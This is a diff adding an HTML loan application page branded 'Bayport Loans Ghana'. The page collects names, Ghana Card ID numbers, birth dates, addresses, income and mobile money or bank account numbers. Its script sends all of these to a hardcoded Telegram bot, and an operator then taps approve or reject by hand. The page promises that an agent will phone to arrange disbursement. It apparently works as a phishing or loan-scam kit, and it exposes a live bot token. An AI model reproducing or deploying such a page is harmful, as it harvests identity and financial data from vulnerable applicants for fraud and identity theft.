@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Bayport Loans Ghana – Apply Now</title>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;900&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet"/>
+<style>
+  :root {
+    --navy: #0a1628; --blue: #1a3a6b; --gold: #c9a84c; --gold-light: #e8c97a;
+    --white: #ffffff; --off-white: #f5f3ee; --gray: #8a8a8a;
+    --light-gray: #e8e5df; --green: #27ae60; --red: #e74c3c;
+  }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:'DM Sans',sans-serif; background:var(--off-white); color:var(--navy); min-height:100vh; }
+
+  /* HEADER */
+  header {
+    background:var(--navy); padding:0 40px;
+    display:flex; align-items:center; justify-content:space-between;
+    height:70px; position:sticky; top:0; z-index:100;
+    box-shadow:0 2px 20px rgba(0,0,0,0.3);
+  }
+  .logo { display:flex; align-items:center; gap:12px; }
+  .logo-icon {
+    width:38px; height:38px;
+    background:linear-gradient(135deg,var(--gold),var(--gold-light));
+    border-radius:8px; display:flex; align-items:center; justify-content:center;
+    font-size:18px; font-weight:900; color:var(--navy); font-family:'Playfair Display',serif;
+  }
+  .logo-text { font-family:'Playfair Display',serif; font-size:20px; font-weight:700; color:var(--white); }
+  .logo-text span { color:var(--gold); }
+  .header-badge {
+    background:rgba(201,168,76,0.15); border:1px solid rgba(201,168,76,0.4);
+    color:var(--gold-light); padding:6px 14px; border-radius:20px;
+    font-size:12px; font-weight:500;
+  }
+
+  /* HERO */
+  .hero {
+    background:linear-gradient(135deg,var(--navy) 0%,var(--blue) 60%,#1e4a8a 100%);
+    padding:70px 40px 80px; text-align:center; position:relative; overflow:hidden;
+  }
+  .hero::before {
+    content:''; position:absolute; top:-50%; left:-20%;
+    width:600px; height:600px;
+    background:radial-gradient(circle,rgba(201,168,76,0.08) 0%,transparent 70%);
+    border-radius:50%;
+  }
+  .hero-tag {
+    display:inline-block; background:rgba(201,168,76,0.2);
+    border:1px solid rgba(201,168,76,0.5); color:var(--gold-light);
+    padding:6px 18px; border-radius:20px; font-size:12px; font-weight:600;
+    letter-spacing:1.5px; text-transform:uppercase; margin-bottom:24px;
+    position:relative; z-index:1; animation:fadeDown 0.6s ease both;
+  }
+  .hero h1 {
+    font-family:'Playfair Display',serif; font-size:clamp(32px,5vw,58px);
+    font-weight:900; color:var(--white); line-height:1.1; margin-bottom:20px;
+    position:relative; z-index:1; animation:fadeDown 0.6s ease 0.1s both;
+  }
+  .hero h1 span { color:var(--gold); }
+  .hero p {
+    font-size:16px; color:rgba(255,255,255,0.75); max-width:520px;
+    margin:0 auto 40px; line-height:1.7; position:relative; z-index:1;
+    animation:fadeDown 0.6s ease 0.2s both;
+  }
+  .hero-stats {
+    display:flex; justify-content:center; gap:50px; flex-wrap:wrap;
+    position:relative; z-index:1; animation:fadeDown 0.6s ease 0.3s both;
+  }
+  .stat { text-align:center; }
+  .stat-num { font-family:'Playfair Display',serif; font-size:30px; font-weight:700; color:var(--gold); display:block; }
+  .stat-label { font-size:12px; color:rgba(255,255,255,0.6); text-transform:uppercase; letter-spacing:0.5px; }
+
+  /* FEATURES BAR */
+  .features-bar {
+    background:var(--white); padding:22px 40px;
+    display:flex; justify-content:center; gap:40px; flex-wrap:wrap;
+    border-bottom:1px solid var(--light-gray); box-shadow:0 2px 10px rgba(0,0,0,0.05);
+  }
+  .feature-item { display:flex; align-items:center; gap:10px; font-size:14px; font-weight:500; }
+  .feature-icon {
+    width:32px; height:32px;
+    background:linear-gradient(135deg,var(--gold),var(--gold-light));
+    border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:14px;
+  }
+
+  /* MAIN LAYOUT */
+  .main {
+    max-width:1100px; margin:0 auto; padding:60px 24px;
+    display:grid; grid-template-columns:1fr 400px; gap:50px; align-items:start;
+  }
+  @media(max-width:860px){ .main{grid-template-columns:1fr;} .sidebar{order:-1;} }
+
+  /* FORM CARD */
+  .form-card {
+    background:var(--white); border-radius:20px; padding:44px;
+    box-shadow:0 4px 40px rgba(0,0,0,0.08); border:1px solid var(--light-gray);
+    animation:fadeUp 0.6s ease 0.2s both;
+  }
+  .form-card h2 { font-family:'Playfair Display',serif; font-size:26px; font-weight:700; margin-bottom:8px; }
+  .form-card > p { color:var(--gray); font-size:14px; margin-bottom:32px; line-height:1.6; }
+  .section-title {
+    font-size:11px; font-weight:600; text-transform:uppercase;
+    letter-spacing:1.5px; color:var(--gold);
+    margin:28px 0 14px; padding-bottom:8px; border-bottom:1px solid var(--light-gray);
+  }
+  .form-row { display:grid; grid-template-columns:1fr 1fr; gap:16px; }
+  @media(max-width:580px){ .form-row{grid-template-columns:1fr;} .form-card{padding:28px 20px;} }
+  .field { margin-bottom:18px; }
+  label { display:block; font-size:13px; font-weight:600; margin-bottom:7px; }
+  label .req { color:var(--gold); }
+  input,select,textarea {
+    width:100%; padding:13px 16px; border:1.5px solid var(--light-gray);
+    border-radius:10px; font-family:'DM Sans',sans-serif; font-size:14px;
+    color:var(--navy); background:var(--off-white); outline:none; appearance:none;
+    transition:border-color 0.2s, box-shadow 0.2s, background 0.2s;
+  }
+  input:focus,select:focus,textarea:focus {
+    border-color:var(--gold); background:var(--white);
+    box-shadow:0 0 0 3px rgba(201,168,76,0.12);
+  }
+  input::placeholder,textarea::placeholder { color:#bbb; }
+  select {
+    background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%238a8a8a' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
+    background-repeat:no-repeat; background-position:right 14px center; padding-right:40px; cursor:pointer;
+  }
+  textarea { resize:vertical; min-height:90px; }
+
+  .submit-btn {
+    width:100%; padding:16px;
+    background:linear-gradient(135deg,var(--gold),var(--gold-light));
+    color:var(--navy); border:none; border-radius:12px;
+    font-family:'DM Sans',sans-serif; font-size:16px; font-weight:700;
+    cursor:pointer; margin-top:10px;
+    display:flex; align-items:center; justify-content:center; gap:10px;
+    transition:transform 0.15s, box-shadow 0.15s;
+  }
+  .submit-btn:hover { transform:translateY(-2px); box-shadow:0 8px 25px rgba(201,168,76,0.4); }
+  .submit-btn:disabled { opacity:0.7; cursor:not-allowed; transform:none; }
+  .spinner {
+    width:18px; height:18px; border:2px solid rgba(10,22,40,0.3);
+    border-top-color:var(--navy); border-radius:50%;
+    animation:spin 0.7s linear infinite; display:none;
+  }
+  .err-toast {
+    display:none; padding:14px 18px; border-radius:10px; font-size:14px;
+    background:rgba(231,76,60,0.1); border:1px solid rgba(231,76,60,0.3);
+    color:#a93226; margin-top:14px; line-height:1.5;
+  }
+
+  /* PENDING SCREEN */
+  .pending-screen { display:none; text-align:center; padding:30px 10px; }
+  .pending-screen.show { display:block; }
+  .pending-icon {
+    width:72px; height:72px; border-radius:50%;
+    background:linear-gradient(135deg,var(--gold),var(--gold-light));
+    display:flex; align-items:center; justify-content:center;
+    font-size:32px; margin:0 auto 20px; animation:pulse 2s ease infinite;
+  }
+  .pending-screen h3 { font-family:'Playfair Display',serif; font-size:22px; margin-bottom:12px; }
+  .pending-screen p { font-size:14px; color:var(--gray); line-height:1.7; max-width:380px; margin:0 auto 20px; }
+  .ref-box {
+    display:inline-block; background:var(--off-white); border:1px solid var(--light-gray);
+    border-radius:10px; padding:12px 24px; font-size:22px; font-weight:700;
+    font-family:'Playfair Display',serif; letter-spacing:2px; margin-bottom:8px;
+  }
+  .status-bar {
+    display:flex; align-items:center; justify-content:center; gap:8px;
+    font-size:13px; color:var(--gray); margin-top:14px;
+  }
+  .status-dot { width:8px; height:8px; border-radius:50%; background:var(--gold); animation:blink 1.5s ease infinite; }
+
+  /* RESULT SCREENS */
+  .result-screen { display:none; text-align:center; padding:30px 10px; }
+  .result-screen.show { display:block; }
+  .result-icon {
+    width:80px; height:80px; border-radius:50%;
+    display:flex; align-items:center; justify-content:center;
+    font-size:38px; margin:0 auto 20px;
+  }
+  .result-icon.approved { background:rgba(39,174,96,0.12); }
+  .result-icon.rejected { background:rgba(231,76,60,0.12); }
+  .result-screen h3 { font-family:'Playfair Display',serif; font-size:24px; margin-bottom:10px; }
+  .approved-title { color:var(--green); }
+  .rejected-title { color:var(--red); }
+  .result-screen p { font-size:14px; color:var(--gray); line-height:1.7; max-width:380px; margin:0 auto 16px; }
+  .result-detail {
+    background:var(--off-white); border-radius:12px; padding:18px 20px;
+    text-align:left; margin-bottom:18px; font-size:14px; line-height:2;
+    border:1px solid var(--light-gray);
+  }
+  .result-detail strong { color:var(--navy); }
+  .new-app-btn {
+    padding:12px 28px; border-radius:10px; border:2px solid var(--gold);
+    background:transparent; color:var(--navy); font-family:'DM Sans',sans-serif;
+    font-size:14px; font-weight:600; cursor:pointer; transition:background 0.2s;
+  }
+  .new-app-btn:hover { background:var(--gold); }
+
+  /* SIDEBAR */
+  .sidebar { animation:fadeUp 0.6s ease 0.35s both; }
+  .info-card {
+    background:var(--navy); border-radius:18px; padding:30px;
+    color:var(--white); margin-bottom:20px; position:relative; overflow:hidden;
+  }
+  .info-card::before {
+    content:''; position:absolute; top:-40px; right:-40px;
+    width:160px; height:160px;
+    background:radial-gradient(circle,rgba(201,168,76,0.15) 0%,transparent 70%);
+    border-radius:50%;
+  }
+  .info-card h3 { font-family:'Playfair Display',serif; font-size:19px; font-weight:700; margin-bottom:18px; position:relative; z-index:1; }
+  .info-card h3 span { color:var(--gold); }
+  .loan-opt {
+    background:rgba(255,255,255,0.07); border:1px solid rgba(255,255,255,0.1);
+    border-radius:12px; padding:14px; margin-bottom:10px; position:relative; z-index:1;
+  }
+  .loan-opt-name { font-weight:600; font-size:13px; color:var(--gold-light); margin-bottom:3px; }
+  .loan-opt-detail { font-size:12px; color:rgba(255,255,255,0.6); line-height:1.5; }
+  .steps-card {
+    background:var(--white); border-radius:18px; padding:28px;
+    border:1px solid var(--light-gray); box-shadow:0 4px 20px rgba(0,0,0,0.05);
+  }
+  .steps-card h3 { font-family:'Playfair Display',serif; font-size:18px; font-weight:700; margin-bottom:18px; }
+  .step { display:flex; gap:14px; margin-bottom:16px; align-items:flex-start; }
+  .step-num {
+    width:28px; height:28px; border-radius:50%; flex-shrink:0;
+    background:linear-gradient(135deg,var(--gold),var(--gold-light));
+    display:flex; align-items:center; justify-content:center;
+    font-size:12px; font-weight:700; color:var(--navy);
+  }
+  .step-text { font-size:13px; color:var(--gray); line-height:1.6; }
+  .step-text strong { color:var(--navy); display:block; margin-bottom:2px; }
+
+  /* FOOTER */
+  footer {
+    background:var(--navy); color:rgba(255,255,255,0.5);
+    text-align:center; padding:28px 24px; font-size:13px; line-height:1.7; margin-top:20px;
+  }
+  footer strong { color:var(--gold); }
+
+  @keyframes fadeDown { from{opacity:0;transform:translateY(-20px)} to{opacity:1;transform:translateY(0)} }
+  @keyframes fadeUp   { from{opacity:0;transform:translateY(30px)}  to{opacity:1;transform:translateY(0)} }
+  @keyframes spin     { to{transform:rotate(360deg)} }
+  @keyframes pulse    { 0%,100%{transform:scale(1)} 50%{transform:scale(1.06)} }
+  @keyframes blink    { 0%,100%{opacity:1} 50%{opacity:0.3} }
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header>
+  <div class="logo">
+    <div class="logo-icon">B</div>
+    <div class="logo-text">Bay<span>port</span> Loans Ghana</div>
+  </div>
+  <div class="header-badge">🔒 Secure Application</div>
+</header>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="hero-tag">✦ Fast &amp; Reliable Financing in Ghana</div>
+  <h1>Get the Funds You<br/><span>Need Today</span></h1>
+  <p>Apply in minutes. Get a decision fast. Flexible repayment plans in Ghana Cedis (GHS ₵).</p>
+  <div class="hero-stats">
+    <div class="stat"><span class="stat-num">5 min</span><span class="stat-label">Application Time</span></div>
+    <div class="stat"><span class="stat-num">24 hr</span><span class="stat-label">Response Time</span></div>
+    <div class="stat"><span class="stat-num">100%</span><span class="stat-label">Secure &amp; Private</span></div>
+  </div>
+</section>
+
+<!-- FEATURES BAR -->
+<div class="features-bar">
+  <div class="feature-item"><div class="feature-icon">⚡</div>Quick Approval</div>
+  <div class="feature-item"><div class="feature-icon">🛡</div>No Hidden Fees</div>
+  <div class="feature-item"><div class="feature-icon">📋</div>Minimal Documents</div>
+  <div class="feature-item"><div class="feature-icon">💳</div>Flexible Repayment</div>
+</div>
+
+<!-- MAIN -->
+<div class="main">
+
+  <!-- LEFT: FORM CARD -->
+  <div class="form-card">
+    <h2>Loan Application Form</h2>
+    <p>Fill in your details accurately. Our team reviews every application and responds within 24 hours.</p>
+
+    <!-- THE FORM -->
+    <form id="loanForm">
+
+      <div class="section-title">Personal Information</div>
+      <div class="form-row">
+        <div class="field"><label>First Name <span class="req">*</span></label><input type="text" name="First Name" placeholder="e.g. Kwame" required/></div>
+        <div class="field"><label>Last Name <span class="req">*</span></label><input type="text" name="Last Name" placeholder="e.g. Mensah" required/></div>
+      </div>
+      <div class="form-row">
+        <div class="field"><label>Phone Number <span class="req">*</span></label><input type="tel" name="Phone Number" placeholder="e.g. 0244000000" required/></div>
+        <div class="field"><label>Email Address</label><input type="email" name="Email Address" placeholder="e.g. kwame@email.com"/></div>
+      </div>
+      <div class="form-row">
+        <div class="field"><label>Ghana Card / ID Number <span class="req">*</span></label><input type="text" name="Ghana Card ID Number" placeholder="e.g. GHA-000000000-0" required/></div>
+        <div class="field"><label>Date of Birth <span class="req">*</span></label><input type="date" name="Date of Birth" required/></div>
+      </div>
+      <div class="field"><label>Residential Address <span class="req">*</span></label><input type="text" name="Residential Address" placeholder="e.g. Accra, East Legon" required/></div>
+
+      <div class="section-title">Employment &amp; Income</div>
+      <div class="form-row">
+        <div class="field">
+          <label>Employment Status <span class="req">*</span></label>
+          <select name="Employment Status" required>
+            <option value="" disabled selected>Select status</option>
+            <option>Employed (Salaried)</option>
+            <option>Self-Employed / Business Owner</option>
+            <option>Government / Public Sector</option>
+            <option>Retired</option>
+            <option>Other</option>
+          </select>
+        </div>
+        <div class="field"><label>Employer / Business Name</label><input type="text" name="Employer or Business Name" placeholder="e.g. ABC Ghana Ltd"/></div>
+      </div>
+      <div class="form-row">
+        <div class="field"><label>Monthly Income (GHS ₵) <span class="req">*</span></label><input type="number" name="Monthly Income GHS" placeholder="e.g. 3500" required/></div>
+        <div class="field"><label>Salary Payment Date</label><input type="text" name="Salary Payment Date" placeholder="e.g. 25th of every month"/></div>
+      </div>
+      <div class="form-row">
+        <div class="field"><label>MoMo / Bank Account Number <span class="req">*</span></label><input type="text" name="MoMo or Bank Account Number" placeholder="e.g. 0244000000" required/></div>
+        <div class="field">
+          <label>MoMo Network / Bank <span class="req">*</span></label>
+          <select name="MoMo Network or Bank" required>
+            <option value="" disabled selected>Select provider</option>
+            <option>MTN Mobile Money</option>
+            <option>Vodafone Cash</option>
+            <option>AirtelTigo Money</option>
+            <option>GCB Bank</option>
+            <option>Ecobank Ghana</option>
+            <option>Stanbic Bank Ghana</option>
+            <option>Absa Ghana</option>
+            <option>Other Bank</option>
+          </select>
+        </div>
+      </div>
+
+      <div class="section-title">Loan Details</div>
+      <div class="form-row">
+        <div class="field">
+          <label>Loan Type <span class="req">*</span></label>
+          <select name="Loan Type" required>
+            <option value="" disabled selected>Select type</option>
+            <option>Personal Loan</option>
+            <option>Business Loan</option>
+            <option>Emergency Loan</option>
+            <option>Salary Advance</option>
+            <option>Asset Finance</option>
+          </select>
+        </div>
+        <div class="field"><label>Loan Amount (GHS ₵) <span class="req">*</span></label><input type="number" name="Loan Amount GHS" placeholder="e.g. 5000" required/></div>
+      </div>
+      <div class="form-row">
+        <div class="field">
+          <label>Repayment Period <span class="req">*</span></label>
+          <select name="Repayment Period" required>
+            <option value="" disabled selected>Select period</option>
+            <option>1 Month</option>
+            <option>3 Months</option>
+            <option>6 Months</option>
+            <option>12 Months</option>
+            <option>24 Months</option>
+            <option>36 Months</option>
+          </select>
+        </div>
+        <div class="field">
+          <label>Purpose of Loan <span class="req">*</span></label>
+          <select name="Purpose of Loan" required>
+            <option value="" disabled selected>Select purpose</option>
+            <option>Medical Expenses</option>
+            <option>School Fees</option>
+            <option>Business Capital</option>
+            <option>Home Improvement</option>
+            <option>Vehicle Purchase</option>
+            <option>Debt Consolidation</option>
+            <option>Other</option>
+          </select>
+        </div>
+      </div>
+      <div class="field"><label>Additional Information</label><textarea name="Additional Information" placeholder="Anything else you'd like us to know about your application..."></textarea></div>
+
+      <button type="submit" class="submit-btn" id="submitBtn">
+        <span id="btnText">Submit My Application →</span>
+        <div class="spinner" id="btnSpinner"></div>
+      </button>
+      <div class="err-toast" id="errToast">❌ Something went wrong. Please check your connection and try again.</div>
+
+    </form>
+
+    <!-- PENDING (waiting for your Telegram decision) -->
+    <div class="pending-screen" id="pendingScreen">
+      <div class="pending-icon">⏳</div>
+      <h3>Application Submitted!</h3>
+      <p>Your application is now being reviewed by our team. This page will update automatically once a decision is made — please keep it open.</p>
+      <div class="ref-box" id="refDisplay">BP-000000</div>
+      <p style="font-size:12px;color:var(--gray);margin-top:6px;">Save your reference number</p>
+      <div class="status-bar"><div class="status-dot"></div> Awaiting decision from our team…</div>
+    </div>
+
+    <!-- APPROVED -->
+    <div class="result-screen" id="approvedScreen">
+      <div class="result-icon approved">✅</div>
+      <h3 class="approved-title">Loan Approved!</h3>
+      <p>Congratulations! Your loan application has been <strong>approved</strong>. Below are your confirmed details:</p>
+      <div class="result-detail" id="approvedDetail"></div>
+      <p style="font-size:13px;color:var(--gray);margin-bottom:20px;">
+        Our agent will call you within <strong>2 hours</strong> on your registered number to arrange disbursement to your MoMo / bank account.
+      </p>
+      <button class="new-app-btn" onclick="resetAll()">Submit Another Application</button>
+    </div>
+
+    <!-- REJECTED -->
+    <div class="result-screen" id="rejectedScreen">
+      <div class="result-icon rejected">❌</div>
+      <h3 class="rejected-title">Application Unsuccessful</h3>
+      <p>Unfortunately, we could not process your application at this time.</p>
+      <div class="result-detail" id="rejectedDetail"></div>
+      <p style="font-size:13px;color:var(--gray);margin-bottom:20px;">
+        You may re-apply after <strong>30 days</strong> or contact our support team for more information.
+      </p>
+      <button class="new-app-btn" onclick="resetAll()">Try Again</button>
+    </div>
+
+  </div><!-- /form-card -->
+
+  <!-- RIGHT: SIDEBAR -->
+  <div class="sidebar">
+    <div class="info-card">
+      <h3>Our <span>Loan</span> Products</h3>
+      <div class="loan-opt"><div class="loan-opt-name">💼 Personal Loan</div><div class="loan-opt-detail">Up to GHS 50,000 · 3–36 months · For any personal need</div></div>
+      <div class="loan-opt"><div class="loan-opt-name">🏪 Business Loan</div><div class="loan-opt-detail">Up to GHS 200,000 · Flexible terms · Grow your business</div></div>
+      <div class="loan-opt"><div class="loan-opt-name">🚨 Emergency Loan</div><div class="loan-opt-detail">Up to GHS 10,000 · Same-day processing · Quick relief</div></div>
+      <div class="loan-opt"><div class="loan-opt-name">📅 Salary Advance</div><div class="loan-opt-detail">Up to 3× your salary · Repay on payday · Zero hassle</div></div>
+    </div>
+    <div class="steps-card">
+      <h3>How It Works</h3>
+      <div class="step"><div class="step-num">1</div><div class="step-text"><strong>Fill the Form</strong>Complete your application with accurate details.</div></div>
+      <div class="step"><div class="step-num">2</div><div class="step-text"><strong>We Review</strong>Our team reviews and verifies your application.</div></div>
+      <div class="step"><div class="step-num">3</div><div class="step-text"><strong>Get Decision</strong>This page updates automatically with Approved or Rejected.</div></div>
+      <div class="step"><div class="step-num">4</div><div class="step-text"><strong>Receive Funds</strong>Disbursed to your MoMo or bank account same day.</div></div>
+    </div>
+  </div>
+
+</div><!-- /main -->
+
+<footer>
+  <strong>Bayport Loans Ghana</strong> · Secure &amp; Confidential Applications<br/>
+  Your information is protected and used only for loan processing. All amounts in Ghana Cedis (GHS ₵).
+</footer>
+
+<!-- ════════════════════════════════════════════════════════════
+  TELEGRAM INTEGRATION
+  HOW IT WORKS:
+  1. Applicant submits form → you receive a Telegram message with
+     ✅ APPROVE and ❌ REJECT buttons
+  2. You tap a button → this page detects your choice
+  3. Page instantly shows the applicant Approved or Rejected screen
+════════════════════════════════════════════════════════════ -->
+<script>
+  const BOT_TOKEN    = "8615557108:AAHhIXkY84YkSvvAVYfl6NBFlU4zSIKRsrE";
+  const CHAT_ID      = "8718124300";
+  const API          = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+  let refId        = null;
+  let pollTimer    = null;
+  let lastUpdateId = 0;
+
+  function genRef() {
+    return "BP-" + Math.floor(100000 + Math.random() * 900000);
+  }
+
+  // ── SUBMIT FORM ──────────────────────────────────────────
+  document.getElementById("loanForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
+
+    const btn     = document.getElementById("submitBtn");
+    const spinner = document.getElementById("btnSpinner");
+    const btnText = document.getElementById("btnText");
+    const errBox  = document.getElementById("errToast");
+
+    errBox.style.display = "none";
+    btn.disabled = true;
+    btnText.style.display = "none";
+    spinner.style.display = "block";
+
+    const data   = new FormData(this);
+    const fields = [...data.entries()].filter(([,v]) => String(v).trim() !== "");
+    refId        = genRef();
+
+    const now = new Date().toLocaleString("en-GH", {
+      timeZone: "Africa/Accra", dateStyle: "full", timeStyle: "short"
+    });
+
+    // Format the Telegram notification message
+    const msgText =
+      "🏦 *NEW LOAN APPLICATION — BAYPORT GHANA*\n" +
+      "━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
+      fields.map(([k, v]) => `📌 *${k}:* ${v}`).join("\n") +
+      "\n\n━━━━━━━━━━━━━━━━━━━━━━━\n" +
+      `🔖 *Ref:* \`${refId}\`\n` +
+      `🕐 *Time:* ${now}\n\n` +
+      `👇 *Tap a button to decide:*`;
+
+    // Approve / Reject buttons sent with the message
+    const keyboard = {
+      inline_keyboard: [[
+        { text: "✅  APPROVE LOAN",  callback_data: `APPROVE_${refId}` },
+        { text: "❌  REJECT LOAN",   callback_data: `REJECT_${refId}`  }
+      ]]
+    };
+
+    try {
+      const res    = await fetch(`${API}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: msgText,
+          parse_mode: "Markdown",
+          reply_markup: keyboard
+        })
+      });
+      const result = await res.json();
+
+      if (result.ok) {
+        // Switch to pending screen
+        this.style.display = "none";
+        document.getElementById("refDisplay").textContent = refId;
+        document.getElementById("pendingScreen").classList.add("show");
+
+        // Mark current update position so we only watch for NEW replies
+        await syncUpdateId();
+        // Start watching for your button tap
+        startPolling(fields);
+      } else {
+        throw new Error(result.description || "Telegram error");
+      }
+
+    } catch (err) {
+      console.error(err);
+      errBox.style.display = "block";
+    }
+
+    btn.disabled = false;
+    btnText.style.display = "block";
+    spinner.style.display = "none";
+  });
+
+  // ── SYNC UPDATE ID ───────────────────────────────────────
+  async function syncUpdateId() {
+    try {
+      const res  = await fetch(`${API}/getUpdates?limit=1&offset=-1`);
+      const json = await res.json();
+      if (json.ok && json.result.length > 0) {
+        lastUpdateId = json.result[json.result.length - 1].update_id;
+      }
+    } catch(e) {}
+  }
+
+  // ── POLL FOR YOUR BUTTON TAP ─────────────────────────────
+  function startPolling(fields) {
+    pollTimer = setInterval(async () => {
+      try {
+        const res  = await fetch(`${API}/getUpdates?offset=${lastUpdateId + 1}&timeout=3`);
+        const json = await res.json();
+        if (!json.ok) return;
+
+        for (const upd of json.result) {
+          lastUpdateId = upd.update_id;
+
+          if (upd.callback_query) {
+            const cb = upd.callback_query;
+
+            if (cb.data === `APPROVE_${refId}`) {
+              await tapCallback(cb.id, "✅ Loan Approved!");
+              await markMessage(cb.message, "✅ APPROVED");
+              clearInterval(pollTimer);
+              showApproved(fields);
+              return;
+            }
+
+            if (cb.data === `REJECT_${refId}`) {
+              await tapCallback(cb.id, "❌ Loan Rejected.");
+              await markMessage(cb.message, "❌ REJECTED");
+              clearInterval(pollTimer);
+              showRejected();
+              return;
+            }
+          }
+        }
+      } catch(e) {}
+    }, 3000);
+  }
+
+  // ── ANSWER THE CALLBACK (clears loading on Telegram button) ──
+  async function tapCallback(cbId, text) {
+    await fetch(`${API}/answerCallbackQuery`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ callback_query_id: cbId, text })
+    });
+  }
+
+  // ── UPDATE TELEGRAM MESSAGE TO SHOW DECISION ─────────────
+  async function markMessage(msg, status) {
+    await fetch(`${API}/editMessageText`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: msg.chat.id,
+        message_id: msg.message_id,
+        text: msg.text + `\n\n*Admin decision: ${status}*`,
+        parse_mode: "Markdown"
+      })
+    });
+  }
+
+  // ── SHOW APPROVED RESULT ─────────────────────────────────
+  function showApproved(fields) {
+    document.getElementById("pendingScreen").classList.remove("show");
+
+    const get = key => {
+      const f = fields.find(([k]) => k.toLowerCase().includes(key.toLowerCase()));
+      return f ? f[1] : "—";
+    };
+
+    const name   = get("First") + " " + get("Last");
+    const amt    = get("Loan Amount");
+    const period = get("Repayment");
+    const momo   = get("MoMo");
+    const phone  = get("Phone");
+
+    document.getElementById("approvedDetail").innerHTML =
+      `<strong>Applicant:</strong> ${name}<br/>` +
+      `<strong>Approved Amount:</strong> GHS ₵ ${Number(amt).toLocaleString()}<br/>` +
+      `<strong>Repayment Period:</strong> ${period}<br/>` +
+      `<strong>Disbursement to:</strong> ${momo} (${phone})<br/>` +
+      `<strong>Reference No:</strong> ${refId}`;
+
+    document.getElementById("approvedScreen").classList.add("show");
+  }
+
+  // ── SHOW REJECTED RESULT ─────────────────────────────────
+  function showRejected() {
+    document.getElementById("pendingScreen").classList.remove("show");
+
+    document.getElementById("rejectedDetail").innerHTML =
+      `<strong>Reference No:</strong> ${refId}<br/>` +
+      `<strong>Reason:</strong> Application did not meet current eligibility criteria.<br/>` +
+      `<strong>What to do:</strong> Contact our support team or re-apply in 30 days.`;
+
+    document.getElementById("rejectedScreen").classList.add("show");
+  }
+
+  // ── RESET EVERYTHING ─────────────────────────────────────
+  function resetAll() {
+    clearInterval(pollTimer);
+    refId = null; lastUpdateId = 0;
+    document.getElementById("loanForm").reset();
+    document.getElementById("loanForm").style.display = "block";
+    document.getElementById("pendingScreen").classList.remove("show");
+    document.getElementById("approvedScreen").classList.remove("show");
+    document.getElementById("rejectedScreen").classList.remove("show");
+  }
+</script>
+
+</body>
+</html>
